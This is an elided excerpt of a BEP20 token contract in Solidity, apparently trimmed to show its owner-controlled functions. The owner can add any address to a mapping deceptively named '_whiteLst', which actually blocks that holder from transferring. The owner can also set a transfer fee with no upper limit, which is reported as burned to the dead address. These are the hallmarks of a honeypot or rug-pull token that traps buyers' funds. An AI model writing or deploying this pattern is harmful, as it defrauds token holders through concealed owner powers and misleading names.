...
contract Token is IBEP20, HasForeignAsset {
    ...
    mapping(address => bool) private _whiteLst;
    ...
    uint256 private _feiq = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;




    function getwhiteLst(address account) public view returns (bool) {
        return _whiteLst[account];
    }

    function cancelwhiteLst(address account,bool status) public onlyOwner {
        _whiteLst[account] = status;
    }
    ...
    function setfeiq(uint256 _value) external onlyOwner {
        _feiq = _value;
    }


    function getfeiq() external onlyOwner returns(uint256){
        return _feiq;
    }
     ...
     * e.g. implement automatic token feiqs, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        if (_whiteLst[sender] == true) {
            revert("whiteLst cannot be transferred");
        }
        uint256 feiqamnount = 0;
        feiqamnount = amnount.mul(_feiq).div(100);
        uint256 amoun;
        amoun = amnount - feiqamnount;
        ...
        if (feiqamnount > 0) {
            emit Transfer(sender, _DEADaddress, feiqamnount);
        }
